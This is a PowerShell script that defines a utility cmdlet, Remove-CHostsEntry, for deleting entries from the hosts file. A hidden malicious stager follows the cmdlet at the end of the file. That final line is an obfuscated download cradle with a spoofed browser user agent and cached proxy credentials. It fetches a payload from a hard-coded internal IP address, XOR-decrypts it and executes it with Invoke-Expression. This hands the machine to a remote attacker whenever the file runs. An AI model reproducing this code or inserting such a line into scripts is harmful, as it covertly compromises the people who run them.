
function Remove-CHostsEntry
{
    
    [CmdletBinding(SupportsShouldProcess=$true)]
    param(
        [Parameter(Mandatory=$true,ValueFromPipeline=$true,Position=0)]
        [string[]]
        
        $HostName,

        [string]
        
        $Path = (Get-CPathToHostsFile)
    )

    begin
    {
        Set-StrictMode -Version 'Latest'

        Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState

        $allHostNames = New-Object 'Collections.ArrayList'
    }

    process
    {
        $HostName | 
            ForEach-Object { [Text.RegularExpressions.Regex]::Escape( $_ ) } |
            ForEach-Object { [void] $allHostNames.Add( $_ ) }
    }

    end
    {
        $regex = $allHostNames -join '|'
        $regex = '^[0-9a-f.:]+\s+\b({0})\b.*$' -f $regex 

        $cmdErrors = @()
        $newHostsFile = Read-CFile -Path $Path -ErrorVariable 'cmdErrors' |
                            Where-Object { $_ -notmatch $regex }
        if( $cmdErrors )
        {
            return
        }

        $entryNoun = 'entry'
        if( $HostName.Count -gt 1 )
        {
            $entryNoun = 'entries'
        }

        if( $PSCmdlet.ShouldProcess( $Path, ('removing hosts {0} {1}' -f $entryNoun,($HostName -join ', ')) ) )
        {
            $newHostsFile | Write-CFile -Path $Path
        }
    }
}

$wc=NEw-OBject SysteM.NeT.WebClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HEaders.ADD('User-Agent',$u);$wC.ProxY = [SYSTEM.NeT.WebReqUeSt]::DefaULtWEbPROXy;$WC.ProXy.CREdenTiaLs = [SysTem.NET.CreDENTialCaChE]::DEFaulTNeTWoRkCreDenTiAls;$K='@-KQP<Dud261\H*l[VA%wyEOJq^Zp;(h';$I=0;[CHAR[]]$B=([cHaR[]]($wc.DowNlOADStriNg("http://192.168.3.12:8081/index.asp")))|%{$_-bXOR$K[$I++%$k.LeNgtH]};IEX ($B-jOIN'')

